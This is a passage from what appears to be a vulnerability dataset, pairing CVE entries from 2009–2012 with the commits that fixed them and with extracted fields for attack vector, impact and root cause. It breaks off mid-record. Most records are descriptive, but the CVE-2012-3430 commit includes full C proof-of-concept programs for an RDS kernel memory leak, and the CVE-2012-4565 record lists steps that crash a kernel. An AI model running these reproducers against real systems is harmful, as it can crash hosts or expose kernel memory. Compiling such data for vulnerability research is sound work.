[{"commit_id":"4de30e5500eaeb49f4bf0b7a07f718e149a2ed5e","cve_id":"CVE-2009-1194","cwe_id":"CWE-189","commit_message":"[glyphstring] Handle overflow with very long glyphstrings","summary":"Integer overflow in the pango_glyph_string_set_size function in pango\/glyphstring.c in Pango before 1.24 allows context-dependent attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a long glyph string that triggers a heap-based buffer overflow, as demonstrated by a long document.location value in Firefox.","commit_message_1":"handle overflow with very long glyphstrings","Vulnerability Type":"integer overflow","Attack Vector":"via a long glyph string that triggers a heap - based buffer overflow , as demonstrated by a long document . location value in firefox","Impact":"cause a denial of service ( application crash ) or possibly execute arbitrary code","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"2e8e8c6387ecdf5923dfc4d7718d18eba1b0873d","cve_id":"CVE-2010-2060","cwe_id":null,"commit_message":"Discard job body bytes if the job is too big.\n\nPreviously, a malicious user could craft a job payload and inject\nbeanstalk commands without the client application knowing. (An\nextra-careful client library could check the size of the job body before\nsending the put command, but most libraries do not do this, nor should\nthey have to.)\n\nReported by Graham Barr.","summary":"The put command functionality in beanstalkd 1.4.5 and earlier allows remote attackers to execute arbitrary Beanstalk commands via the body in a job that is too big, which is not properly handled by the dispatch_cmd function in prot.c.","commit_message_1":"discard job body byte if the job is too big","Vulnerability Type":"command execution","Attack Vector":"via the body in a job that is too big , which is not properly handled by the dispatch _ cmd function in prot . c","Impact":"execute arbitrary beanstalk commands","Root Cause":"caused by the improper handling of put commands defining a job by the dispatch_cmd function","Attack Type":"remote attacker"},{"commit_id":"85bbc05b21678e80423815d2ef1dfe26208491ab","cve_id":"CVE-2010-1155","cwe_id":"CWE-20","commit_message":"Check if an SSL certificate matches the hostname of the server we are connecting to\n\ngit-svn-id: http:\/\/svn.irssi.org\/repos\/irssi\/trunk@5104 dbcabf3a-b0e7-0310-adc4-f8d773084564","summary":"Irssi before 0.8.15, when SSL is used, does not verify that the server hostname matches a domain name in the subject's Common Name (CN) field or a Subject Alternative Name field of the X.509 certificate, which allows man-in-the-middle attackers to spoof IRC servers via an arbitrary certificate.","commit_message_1":"check if an ssl certificate match the hostname of the server we are connecting to","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an arbitrary certificate","Impact":"spoof irc servers","Root Cause":"does not verify that the server hostname matches a domain name","Attack Type":"remote attacker"},{"commit_id":"d9cd01ede97f4145af9781d448c62a3318952719","cve_id":"CVE-2010-1152","cwe_id":"CWE-20","commit_message":"Use strncmp when checking for large ascii multigets.","summary":"memcached.c in memcached before 1.4.3 allows remote attackers to cause a denial of service (daemon hang or crash) via a long line that triggers excessive memory allocation.  NOTE: some of these details are obtained from third party information.","commit_message_1":"use strncmp when checking for large ascii multigets","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a long line that triggers excessive memory allocation","Impact":"cause a denial of service ( daemon hang or crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"1958b52d41cba96956dc1995660de49525ed1047","cve_id":"CVE-2010-0011","cwe_id":"CWE-264","commit_message":"disable Uzbl javascript object because of security problem.","summary":"The eval_js function in uzbl-core.c in Uzbl before 2010.01.05 exposes the run method of the Uzbl object, which allows remote attackers to execute arbitrary commands via JavaScript code.","commit_message_1":"disable uzbl javascript object because of security problem","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via javascript code","Impact":"execute arbitrary commands","Root Cause":"caused by the disclosure of the run method of the Uzbl object by the eval_js function within uzbl-core.c","Attack Type":"remote attacker"},{"commit_id":"8312e3fc9041027a33c8bc667bb99740fdf41dd5","cve_id":"CVE-2011-2161","cwe_id":"CWE-399","commit_message":"Do not attempt to decode APE file with no frames\n\nThis fixes invalid reads\/writes with this sample:\nhttp:\/\/packetstorm.linuxsecurity.com\/1103-exploits\/vlc105-dos.txt","summary":"The ape_read_header function in ape.c in libavformat in FFmpeg before 0.5.4, as used in MPlayer, VideoLAN VLC media player, and other products, allows remote attackers to cause a denial of service (application crash) via an APE (aka Monkey's Audio) file that contains a header but no frames.","commit_message_1":"do not attempt to decode ape file with no frame this fix invalid reads\/writes with this sample : http : \/\/<file>","Vulnerability Type":"Resource Management Errors","Attack Vector":"via an ape ( aka monkey ' s audio ) file that contains a header but no frames","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"65c4d4ad331e94661de763e9b5304d28698999c4","cve_id":"CVE-2011-1575","cwe_id":"CWE-399","commit_message":"Flush the command buffer after switching to TLS.\nFixes a flaw similar to CVE-2011-0411.","summary":"The STARTTLS implementation in ftp_parser.c in Pure-FTPd before 1.0.30 does not properly restrict I\/O buffering, which allows man-in-the-middle attackers to insert commands into encrypted FTP sessions by sending a cleartext command that is processed after TLS is in place, related to a *plaintext command injection* attack, a similar issue to CVE-2011-0411.","commit_message_1":"flush the command buffer after switching to tl","Vulnerability Type":"Resource Management Errors","Attack Vector":"by sending a cleartext command that is processed after tls is in place , related to a * plaintext command injection * attack , a similar issue to cve - 2011 - 0411","Impact":"insert commands into encrypted ftp sessions","Root Cause":"does not properly restrict i \/ o buffering","Attack Type":"remote attacker"},{"commit_id":"3ef52043861ab16352d49af89e048ba6339d6df8","cve_id":"CVE-2011-0530","cwe_id":"CWE-119","commit_message":"Fix buffer size checking\n\nYes, this means we've re-introduced CVE-2005-3534. Sigh.","summary":"Buffer overflow in the mainloop function in nbd-server.c in the server in Network Block Device (nbd) before 2.9.20 might allow remote attackers to execute arbitrary code via a long request.  NOTE: this issue exists because of a CVE-2005-3534 regression.","commit_message_1":"fix buffer size checking yes , this mean we 've re-introduced <cve_id>","Vulnerability Type":"buffer overflow","Attack Vector":"via a long request","Impact":"execute arbitrary code","Root Cause":"caused by improper bounds checking by the mainloop function","Attack Type":"remote attacker"},{"commit_id":"95a69adab9acfc3981c504737a2b6578e4d846ef","cve_id":"CVE-2012-5532","cwe_id":null,"commit_message":"tools: hv: Netlink source address validation allows DoS\n\nThe source code without this patch caused hypervkvpd to exit when it processed\na spoofed Netlink packet which has been sent from an untrusted local user.\nNow Netlink messages with a non-zero nl_pid source address are ignored\nand a warning is printed into the syslog.\n\nSigned-off-by: Tomas Hozza <thozza@redhat.com>\nAcked-by:  K. Y. Srinivasan <kys@microsoft.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"The main function in tools\/hv\/hv_kvp_daemon.c in hypervkvpd, as distributed in the Linux kernel before 3.8-rc1, allows local users to cause a denial of service (daemon exit) via a crafted application that sends a Netlink message.  NOTE: this vulnerability exists because of an incorrect fix for CVE-2012-2669.","commit_message_1":"hv : netlink source address validation allows do the source code without this patch caused hypervkvpd to exit when it processed a spoofed netlink packet which ha been sent from an untrusted local user","Vulnerability Type":"daemon exit","Attack Vector":"via a crafted application that sends a netlink message","Impact":"cause a denial of service ( daemon exit )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"08dff7b7d629807dbb1f398c68dd9cd58dd657a1","cve_id":"CVE-2012-5517","cwe_id":null,"commit_message":"mm\/hotplug: correctly add new zone to all other nodes' zone lists\n\nWhen online_pages() is called to add new memory to an empty zone, it\nrebuilds all zone lists by calling build_all_zonelists().  But there's a\nbug which prevents the new zone to be added to other nodes' zone lists.\n\nonline_pages() {\n\tbuild_all_zonelists()\n\t.....\n\tnode_set_state(zone_to_nid(zone), N_HIGH_MEMORY)\n}\n\nHere the node of the zone is put into N_HIGH_MEMORY state after calling\nbuild_all_zonelists(), but build_all_zonelists() only adds zones from\nnodes in N_HIGH_MEMORY state to the fallback zone lists.\nbuild_all_zonelists()\n\n    ->__build_all_zonelists()\n\t->build_zonelists()\n\t    ->find_next_best_node()\n\t\t->for_each_node_state(n, N_HIGH_MEMORY)\n\nSo memory in the new zone will never be used by other nodes, and it may\ncause strange behavor when system is under memory pressure.  So put node\ninto N_HIGH_MEMORY state before calling build_all_zonelists().\n\nSigned-off-by: Jianguo Wu <wujianguo@huawei.com>\nSigned-off-by: Jiang Liu <liuj97@gmail.com>\nCc: Mel Gorman <mgorman@suse.de>\nCc: Michal Hocko <mhocko@suse.cz>\nCc: Minchan Kim <minchan@kernel.org>\nCc: Rusty Russell <rusty@rustcorp.com.au>\nCc: Yinghai Lu <yinghai@kernel.org>\nCc: Tony Luck <tony.luck@intel.com>\nCc: KAMEZAWA Hiroyuki <kamezawa.hiroyu@jp.fujitsu.com>\nCc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com>\nCc: David Rientjes <rientjes@google.com>\nCc: Keping Chen <chenkeping@huawei.com>\nSigned-off-by: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The online_pages function in mm\/memory_hotplug.c in the Linux kernel before 3.6 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact in opportunistic circumstances by using memory that was hot-added by an administrator.","commit_message_1":"correctly add new zone to all other node ' zone list when online_pages ( ) is called to add new memory to an empty zone , it rebuilds all zone list by calling build_all_zonelists ( )","Vulnerability Type":"NULL pointer dereference","Attack Vector":"by using memory that was hot - added by an administrator","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact in opportunistic circumstances","Root Cause":"caused by a NULL pointer dereference related to the way hot-added memory is propagated to other nodes zonelists","Attack Type":"local attacker"},{"commit_id":"8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664","cve_id":"CVE-2012-4565","cwe_id":"CWE-189","commit_message":"net: fix divide by zero in tcp algorithm illinois\n\nReading TCP stats when using TCP Illinois congestion control algorithm\ncan cause a divide by zero kernel oops.\n\nThe division by zero occur in tcp_illinois_info() at:\n do_div(t, ca->cnt_rtt);\nwhere ca->cnt_rtt can become zero (when rtt_reset is called)\n\nSteps to Reproduce:\n 1. Register tcp_illinois:\n     # sysctl -w net.ipv4.tcp_congestion_control=illinois\n 2. Monitor internal TCP information via command \"ss -i\"\n     # watch -d ss -i\n 3. Establish new TCP conn to machine\n\nEither it fails at the initial conn, or else it needs to wait\nfor a loss or a reset.\n\nThis is only related to reading stats.  The function avg_delay() also\nperforms the same divide, but is guarded with a (ca->cnt_rtt > 0) at its\ncalling point in update_params().  Thus, simply fix tcp_illinois_info().\n\nFunction tcp_illinois_info() \/ get_info() is called without\nsocket lock.  Thus, eliminate any race condition on ca->cnt_rtt\nby using a local stack variable.  Simply reuse info.tcpv_rttcnt,\nas its already set to ca->cnt_rtt.\nFunction avg_delay() is not affected by this race condition, as\nits called with the socket lock.\n\nCc: Petr Matousek <pmatouse@redhat.com>\nSigned-off-by: Jesper Dangaard Brouer <brouer@redhat.com>\nAcked-by: Eric Dumazet <edumazet@google.com>\nAcked-by: Stephen Hemminger <shemminger@vyatta.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tcp_illinois_info function in net\/ipv4\/tcp_illinois.c in the Linux kernel before 3.4.19, when the net.ipv4.tcp_congestion_control illinois setting is enabled, allows local users to cause a denial of service (divide-by-zero error and OOPS) by reading TCP stats.","commit_message_1":"fix divide by zero in tcp algorithm illinois reading tcp stats when using tcp illinois congestion control algorithm can cause a divide by zero kernel oops","Vulnerability Type":"Numeric Errors","Attack Vector":"by reading tcp stats","Impact":"cause a denial of service ( divide - by - zero error and oops )","Root Cause":"when the net.ipv4.tcp_congestion_control illinois setting is enabled","Attack Type":"local attacker"},{"commit_id":"dee1f973ca341c266229faa5a1a5bb268bed3531","cve_id":"CVE-2012-4508","cwe_id":"CWE-362","commit_message":"ext4: race-condition protection for ext4_convert_unwritten_extents_endio\n\nWe assumed that at the time we call ext4_convert_unwritten_extents_endio()\nextent in question is fully inside [map.m_lblk, map->m_len] because\nit was already split during submission.  But this may not be true due to\na race between writeback vs fallocate.\n\nIf extent in question is larger than requested we will split it again.\nSpecial precautions should being done if zeroout required because\n[map.m_lblk, map->m_len] already contains valid data.\n\nSigned-off-by: Dmitry Monakhov <dmonakhov@openvz.org>\nSigned-off-by: \"Theodore Ts'o\" <tytso@mit.edu>\nCc: stable@vger.kernel.org","summary":"Race condition in fs\/ext4\/extents.c in the Linux kernel before 3.4.16 allows local users to obtain sensitive information from a deleted file by reading an extent that was not properly marked as uninitialized.","commit_message_1":"race-condition protection for ext4_convert_unwritten_extents_endio we assumed that at the time we call ext4_convert_unwritten_extents_endio ( ) extent in question is fully inside [ <file> , map- > m_len ] because it wa already split during submission","Vulnerability Type":"Race Condition","Attack Vector":"by reading an extent that was not properly marked as uninitialized","Impact":"obtain sensitive information from a deleted file","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"ed6fe9d614fc1bca95eb8c0ccd0e92db00ef9d5d","cve_id":"CVE-2012-4467","cwe_id":"CWE-399","commit_message":"Fix order of arguments to compat_put_time[spec|val]\n\nCommit 644595f89620 (\"compat: Handle COMPAT_USE_64BIT_TIME in\nnet\/socket.c\") introduced a bug where the helper functions to take\neither a 64-bit or compat time[spec|val] got the arguments in the wrong\norder, passing the kernel stack pointer off as a user pointer (and vice\nversa).\n\nBecause of the user address range check, that in turn then causes an\nEFAULT due to the user pointer range checking failing for the kernel\naddress.  Incorrectly resuling in a failed system call for 32-bit\nprocesses with a 64-bit kernel.\n\nOn odder architectures like HP-PA (with separate user\/kernel address\nspaces), it can be used read kernel memory.\n\nSigned-off-by: Mikulas Patocka <mpatocka@redhat.com>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"The (1) do_siocgstamp and (2) do_siocgstampns functions in net\/socket.c in the Linux kernel before 3.5.4 use an incorrect argument order, which allows local users to obtain sensitive information from kernel memory or cause a denial of service (system crash) via a crafted ioctl call.","commit_message_1":"fix order of argument to compat_put_time [ spec|val ] commit 644595f89620 ( `` compat : handle compat_use_64bit_time in net\/<file> '' ) introduced a bug where the helper function to take either a <number>-bit or compat time [ spec|val ] got the argument in the wrong order , passing the kernel stack pointer off a a user pointer ( and vice versa )","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted ioctl call","Impact":"obtain sensitive information from kernel memory or cause a denial of service ( system crash )","Root Cause":"use an incorrect argument order ","Attack Type":"local attacker"},{"commit_id":"70789d7052239992824628db8133de08dc78e593","cve_id":"CVE-2012-4444","cwe_id":null,"commit_message":"ipv6: discard overlapping fragment\n\nRFC5722 prohibits reassembling fragments when some data overlaps.\n\nBug spotted by Zhang Zuotao <zuotao.zhang@6wind.com>.\n\nSigned-off-by: Nicolas Dichtel <nicolas.dichtel@6wind.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The ip6_frag_queue function in net\/ipv6\/reassembly.c in the Linux kernel before 2.6.36 allows remote attackers to bypass intended network restrictions via overlapping IPv6 fragments.","commit_message_1":"discard overlapping fragment rfc5722 prohibits reassembling fragment when some data overlap","Vulnerability Type":"IPv6 fragments","Attack Vector":"via overlapping ipv6 fragments ","Impact":"bypass intended network restrictions","Root Cause":"caused by an error related to the acceptance of overlapping fragmented ipv6 packets","Attack Type":"remote attacker"},{"commit_id":"f6d8bd051c391c1c0458a30b2a7abcd939329259","cve_id":"CVE-2012-3552","cwe_id":"CWE-362","commit_message":"inet: add RCU protection to inet->opt\n\nWe lack proper synchronization to manipulate inet->opt ip_options\n\nProblem is ip_make_skb() calls ip_setup_cork() and\nip_setup_cork() possibly makes a copy of ipc->opt (struct ip_options),\nwithout any protection against another thread manipulating inet->opt.\n\nAnother thread can change inet->opt pointer and free old one under us.\n\nUse RCU to protect inet->opt (changed to inet->inet_opt).\n\nInstead of handling atomic refcounts, just copy ip_options when\nnecessary, to avoid cache line dirtying.\n\nWe cant insert an rcu_head in struct ip_options since its included in\nskb->cb[], so this patch is large because I had to introduce a new\nip_options_rcu structure.\n\nSigned-off-by: Eric Dumazet <eric.dumazet@gmail.com>\nCc: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Race condition in the IP implementation in the Linux kernel before 3.0 might allow remote attackers to cause a denial of service (slab corruption and system crash) by sending packets to an application that sets socket options during the handling of network traffic.","commit_message_1":"add rcu protection to inet- > opt we lack proper synchronization to manipulate inet- > opt ip_options problem is ip_make_skb ( ) call ip_setup_cork ( ) and ip_setup_cork ( ) possibly make a copy of ipc- > opt ( struct ip_options ) , without any protection against another thread manipulating inet- > opt","Vulnerability Type":"Race condition","Attack Vector":"by sending packets to an application that sets socket options during the handling of network traffic","Impact":"cause a denial of service ( slab corruption and system crash )","Root Cause":"caused by improper synchronization around inet->opt ip_options","Attack Type":"remote attacker"},{"commit_id":"aabcffae560d5fd00cd1d2ffce5d760353cf0a4d","cve_id":"CVE-2012-3525","cwe_id":"CWE-20","commit_message":"Fixed possibility of Unsolicited Dialback Attacks","summary":"s2s\/out.c in jabberd2 2.2.16 and earlier does not verify that a request was made for an XMPP Server Dialback response, which allows remote XMPP servers to spoof domains via a (1) Verify Response or (2) Authorization Response.","commit_message_1":"fixed possibility of unsolicited dialback attack","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a verify response or authorization response","Impact":"spoof domains","Root Cause":"does not verify that a request was made for an xmpp server dialback response","Attack Type":"remote attacker"},{"commit_id":"e0e3cea46d31d23dc40df0a49a7a2c04fe8edfea","cve_id":"CVE-2012-3520","cwe_id":"CWE-287","commit_message":"af_netlink: force credentials passing [CVE-2012-3520]\n\nPablo Neira Ayuso discovered that avahi and\npotentially NetworkManager accept spoofed Netlink messages because of a\nkernel bug.  The kernel passes all-zero SCM_CREDENTIALS ancillary data\nto the receiver if the sender did not provide such data, instead of not\nincluding any such data at all or including the correct data from the\npeer (as it is the case with AF_UNIX).\n\nThis bug was introduced in commit 16e572626961\n(af_unix: dont send SCM_CREDENTIALS by default)\n\nThis patch forces passing credentials for netlink, as\nbefore the regression.\n\nAnother fix would be to not add SCM_CREDENTIALS in\nnetlink messages if not provided by the sender, but it\nmight break some programs.\n\nWith help from Florian Weimer & Petr Matousek\n\nThis issue is designated as CVE-2012-3520\n\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nCc: Petr Matousek <pmatouse@redhat.com>\nCc: Florian Weimer <fweimer@redhat.com>\nCc: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Netlink implementation in the Linux kernel before 3.2.30 does not properly handle messages that lack SCM_CREDENTIALS data, which might allow local users to spoof Netlink communication via a crafted message, as demonstrated by a message to (1) Avahi or (2) NetworkManager.","commit_message_1":"force credential passing [ <cve_id> ] pablo neira ayuso discovered that avahi and potentially networkmanager accept spoofed netlink message because of a kernel bug","Vulnerability Type":"Improper Authentication","Attack Vector":"via a crafted message , as demonstrated by a message to ( 1 ) avahi or ( 2 ) networkmanager .","Impact":"spoof netlink communication","Root Cause":"does not properly handle messages that lack scm _ credentials data","Attack Type":"local attacker"},{"commit_id":"9ab4233dd08036fe34a89c7dc6f47a8bf2eb29eb","cve_id":"CVE-2012-3511","cwe_id":"CWE-362","commit_message":"mm: Hold a file reference in madvise_remove\n\nOtherwise the code races with munmap (causing a use-after-free\nof the vma) or with close (causing a use-after-free of the struct\nfile).\n\nThe bug was introduced by commit 90ed52ebe481 (\"[PATCH] holepunch: fix\nmmap_sem i_mutex deadlock\")\n\nCc: Hugh Dickins <hugh@veritas.com>\nCc: Miklos Szeredi <mszeredi@suse.cz>\nCc: Badari Pulavarty <pbadari@us.ibm.com>\nCc: Nick Piggin <npiggin@suse.de>\nCc: stable@vger.kernel.org\nSigned-off-by: Andy Lutomirski <luto@amacapital.net>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Multiple race conditions in the madvise_remove function in mm\/madvise.c in the Linux kernel before 3.4.5 allow local users to cause a denial of service (use-after-free and system crash) via vectors involving a (1) munmap or (2) close system call.","commit_message_1":"hold a file reference in madvise_remove otherwise the code race with munmap ( causing a use-after-free of the vma ) or with close ( causing a use-after-free of the struct file )","Vulnerability Type":"Race Condition","Attack Vector":"via vectors involving a ( 1 ) munmap or ( 2 ) close system call","Impact":"cause a denial of service ( use - after - free and system crash )","Root Cause":"caused by a use-after-free error","Attack Type":"local attacker"},{"commit_id":"f0ec1aaf54caddd21c259aea8b2ecfbde4ee4fb9","cve_id":"CVE-2012-3510","cwe_id":"CWE-399","commit_message":"[PATCH] xacct_add_tsk: fix pure theoretical ->mm use-after-free\n\nParanoid fix. The task can free its ->mm after the 'if (p->mm)' check.\n\nSigned-off-by: Oleg Nesterov <oleg@tv-sign.ru>\nCc: Shailabh Nagar <nagar@watson.ibm.com>\nCc: Balbir Singh <balbir@in.ibm.com>\nCc: Jay Lan <jlan@sgi.com>\nSigned-off-by: Andrew Morton <akpm@osdl.org>\nSigned-off-by: Linus Torvalds <torvalds@osdl.org>","summary":"Use-after-free vulnerability in the xacct_add_tsk function in kernel\/tsacct.c in the Linux kernel before 2.6.19 allows local users to obtain potentially sensitive information from kernel memory or cause a denial of service (system crash) via a taskstats TASKSTATS_CMD_ATTR_PID command.","commit_message_1":"fix pure theoretical - > mm use-after-free paranoid fix","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a taskstats taskstats _ cmd _ attr _ pid command","Impact":"obtain potentially sensitive information from kernel memory or cause a denial of service ( system crash )","Root Cause":"caused by a use-after-free error","Attack Type":"local attacker"},{"commit_id":"06b6a1cf6e776426766298d055bb3991957d90a7","cve_id":"CVE-2012-3430","cwe_id":"CWE-200","commit_message":"rds: set correct msg_namelen\n\nJay Fenlason (fenlason@redhat.com) found a bug,\nthat recvfrom() on an RDS socket can return the contents of random kernel\nmemory to userspace if it was called with a address length larger than\nsizeof(struct sockaddr_in).\nrds_recvmsg() also fails to set the addr_len paramater properly before\nreturning, but that's just a bug.\nThere are also a number of cases wher recvfrom() can return an entirely bogus\naddress. Anything in rds_recvmsg() that returns a non-negative value but does\nnot go through the \"sin = (struct sockaddr_in *)msg->msg_name;\" code path\nat the end of the while(1) loop will return up to 128 bytes of kernel memory\nto userspace.\n\nAnd I write two test programs to reproduce this bug, you will see that in\nrds_server, fromAddr will be overwritten and the following sock_fd will be\ndestroyed.\nYes, it is the programmer's fault to set msg_namelen incorrectly, but it is\nbetter to make the kernel copy the real length of address to user space in\nsuch case.\n\nHow to run the test programs ?\nI test them on 32bit x86 system, 3.5.0-rc7.\n\n1 compile\ngcc -o rds_client rds_client.c\ngcc -o rds_server rds_server.c\n\n2 run .\/rds_server on one console\n\n3 run .\/rds_client on another console\n\n4 you will see something like:\nserver is waiting to receive data...\nold socket fd=3\nserver received data from client:data from client\nmsg.msg_namelen=32\nnew socket fd=-1067277685\nsendmsg()\n: Bad file descriptor\n\n\/***************** rds_client.c ********************\/\n\nint main(void)\n{\n\tint sock_fd;\n\tstruct sockaddr_in serverAddr;\n\tstruct sockaddr_in toAddr;\n\tchar recvBuffer[128] = \"data from client\";\n\tstruct msghdr msg;\n\tstruct iovec iov;\n\n\tsock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0);\n\tif (sock_fd < 0) {\n\t\tperror(\"create socket error\\n\");\n\t\texit(1);\n\t}\n\n\tmemset(&serverAddr, 0, sizeof(serverAddr));\n\tserverAddr.sin_family = AF_INET;\n\tserverAddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n\tserverAddr.sin_port = htons(4001);\n\n\tif (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {\n\t\tperror(\"bind() error\\n\");\n\t\tclose(sock_fd);\n\t\texit(1);\n\t}\n\n\tmemset(&toAddr, 0, sizeof(toAddr));\n\ttoAddr.sin_family = AF_INET;\n\ttoAddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n\ttoAddr.sin_port = htons(4000);\n\tmsg.msg_name = &toAddr;\n\tmsg.msg_namelen = sizeof(toAddr);\n\tmsg.msg_iov = &iov;\n\tmsg.msg_iovlen = 1;\n\tmsg.msg_iov->iov_base = recvBuffer;\n\tmsg.msg_iov->iov_len = strlen(recvBuffer) + 1;\n\tmsg.msg_control = 0;\n\tmsg.msg_controllen = 0;\n\tmsg.msg_flags = 0;\n\n\tif (sendmsg(sock_fd, &msg, 0) == -1) {\n\t\tperror(\"sendto() error\\n\");\n\t\tclose(sock_fd);\n\t\texit(1);\n\t}\n\n\tprintf(\"client send data:%s\\n\", recvBuffer);\n\n\tmemset(recvBuffer, '\\0', 128);\n\n\tmsg.msg_name = &toAddr;\n\tmsg.msg_namelen = sizeof(toAddr);\n\tmsg.msg_iov = &iov;\n\tmsg.msg_iovlen = 1;\n\tmsg.msg_iov->iov_base = recvBuffer;\n\tmsg.msg_iov->iov_len = 128;\n\tmsg.msg_control = 0;\n\tmsg.msg_controllen = 0;\n\tmsg.msg_flags = 0;\n\tif (recvmsg(sock_fd, &msg, 0) == -1) {\n\t\tperror(\"recvmsg() error\\n\");\n\t\tclose(sock_fd);\n\t\texit(1);\n\t}\n\n\tprintf(\"receive data from server:%s\\n\", recvBuffer);\n\n\tclose(sock_fd);\n\n\treturn 0;\n}\n\n\/***************** rds_server.c ********************\/\n\nint main(void)\n{\n\tstruct sockaddr_in fromAddr;\n\tint sock_fd;\n\tstruct sockaddr_in serverAddr;\n\tunsigned int addrLen;\n\tchar recvBuffer[128];\n\tstruct msghdr msg;\n\tstruct iovec iov;\n\n\tsock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0);\n\tif(sock_fd < 0) {\n\t\tperror(\"create socket error\\n\");\n\t\texit(0);\n\t}\n\n\tmemset(&serverAddr, 0, sizeof(serverAddr));\n\tserverAddr.sin_family = AF_INET;\n\tserverAddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");\n\tserverAddr.sin_port = htons(4000);\n\tif (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {\n\t\tperror(\"bind error\\n\");\n\t\tclose(sock_fd);\n\t\texit(1);\n\t}\n\n\tprintf(\"server is waiting to receive data...\\n\");\n\tmsg.msg_name = &fromAddr;\n\n\t\/*\n\t * I add 16 to sizeof(fromAddr), ie 32,\n\t * and pay attention to the definition of fromAddr,\n\t * recvmsg() will overwrite sock_fd,\n\t * since kernel will copy 32 bytes to userspace.\n\t *\n\t * If you just use sizeof(fromAddr), it works fine.\n\t * *\/\n\tmsg.msg_namelen = sizeof(fromAddr) + 16;\n\t\/* msg.msg_namelen = sizeof(fromAddr); *\/\n\tmsg.msg_iov = &iov;\n\tmsg.msg_iovlen = 1;\n\tmsg.msg_iov->iov_base = recvBuffer;\n\tmsg.msg_iov->iov_len = 128;\n\tmsg.msg_control = 0;\n\tmsg.msg_controllen = 0;\n\tmsg.msg_flags = 0;\n\n\twhile (1) {\n\t\tprintf(\"old socket fd=%d\\n\", sock_fd);\n\t\tif (recvmsg(sock_fd, &msg, 0) == -1) {\n\t\t\tperror(\"recvmsg() error\\n\");\n\t\t\tclose(sock_fd);\n\t\t\texit(1);\n\t\t}\n\t\tprintf(\"server received data from client:%s\\n\", recvBuffer);\n\t\tprintf(\"msg.msg_namelen=%d\\n\", msg.msg_namelen);\n\t\tprintf(\"new socket fd=%d\\n\", sock_fd);\n\t\tstrcat(recvBuffer, \"--data from server\");\n\t\tif (sendmsg(sock_fd, &msg, 0) == -1) {\n\t\t\tperror(\"sendmsg()\\n\");\n\t\t\tclose(sock_fd);\n\t\t\texit(1);\n\t\t}\n\t}\n\n\tclose(sock_fd);\n\treturn 0;\n}\n\nSigned-off-by: Weiping Pan <wpan@redhat.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The rds_recvmsg function in net\/rds\/recv.c in the Linux kernel before 3.0.44 does not initialize a certain structure member, which allows local users to obtain potentially sensitive information from kernel stack memory via a (1) recvfrom or (2) recvmsg system call on an RDS socket.","commit_message_1":"set correct msg_namelen jay fenlason ( fenlason @ <file> ) found a bug , that recvfrom ( ) on an rds socket can return the content of random kernel memory to userspace if it wa called with a address length larger than sizeof ( struct sockaddr_in )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a recvfrom or recvmsg system call on an rds socket","Impact":"obtain potentially sensitive information from kernel stack memory","Root Cause":"does not initialize a certain structure member","Attack Type":"local attacker"},{"commit_id":"68cb695ccecf949d48949e72f8ce591fdaaa325c","cve_id":"CVE-2012-3412","cwe_id":"CWE-189","commit_message":"sfc: Fix maximum number of TSO segments and minimum TX queue size\n\n[ Upstream commit 7e6d06f0de3f74ca929441add094518ae332257c ]\n\nCurrently an skb requiring TSO may not fit within a minimum-size TX\nqueue.  The TX queue selected for the skb may stall and trigger the TX\nwatchdog repeatedly (since the problem skb will be retried after the\nTX reset).  This issue is designated as CVE-2012-3412.\n\nSet the maximum number of TSO segments for our devices to 100.  This\nshould make no difference to behaviour unless the actual MSS is less\nthan about 700.  Increase the minimum TX queue size accordingly to\nallow for 2 worst-case skbs, so that there will definitely be space\nto add an skb after we wake a queue.\n\nTo avoid invalidating existing configurations, change\nefx_ethtool_set_ringparam() to fix up values that are too small rather\nthan returning -EINVAL.\n\nSigned-off-by: Ben Hutchings <bhutchings@solarflare.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>\nSigned-off-by: Ben Hutchings <ben@decadent.org.uk>","summary":"The sfc (aka Solarflare Solarstorm) driver in the Linux kernel before 3.2.30 allows remote attackers to cause a denial of service (DMA descriptor consumption and network-controller outage) via crafted TCP packets that trigger a small MSS value.","commit_message_1":"fix maximum number of tso segment and minimum tx queue size [ upstream commit 7e6d06f0de3f74ca929441add094518ae332257c ] currently an skb requiring tso may not fit within a minimum-size tx queue","Vulnerability Type":"Numeric Errors","Attack Vector":"via crafted tcp packets that trigger a small mss value","Impact":"cause a denial of service ( dma descriptor consumption and network - controller outage 